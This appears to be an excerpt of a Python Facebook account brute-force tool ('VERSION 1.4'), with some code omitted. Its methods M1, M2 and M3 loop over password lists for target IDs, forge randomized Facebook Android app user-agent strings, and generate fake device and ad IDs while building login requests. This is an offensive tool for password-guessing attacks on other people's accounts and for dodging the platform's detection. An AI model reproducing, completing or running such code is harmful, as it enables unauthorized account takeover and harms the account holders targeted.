...
\033[1;32m[\033[1;31m=\033[1;32m] \033[1;32mVERSION \033[1;37m: 1.4
\033[1;32m══════════════════════════════════════""")
def linex():
    print('\033[1;32m══════════════════════════════════════')
def clear():
...
def M1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/196.0.0.41;FBBV/39317499;FBDM/{density=2.75,width=834,height=1946};FBLC/pl_PL;FBCR/LG Uplus;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A115SM-A;FBSV/7.1;nullFBCA/armeabi-v7a:armeabi;]"
...
def M2(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/196.0.0.44;FBBV/55488936;FBDM/{density=2.5,width=775,height=2219};FBLC/sl_SL;FBCR/EcoMobile;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A606Y;FBSV/10.0;nullFBCA/armeabi-v7a:armeabi;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
...
def M3(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/196.0.0.37;FBBV/47315444;FBDM/{density=1.75,width=1101,height=2306};FBLC/en_BE;FBCR/LG Uplus;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A716S;FBSV/10.1;nullFBCA/armeabi-v7a:armeabi;]"
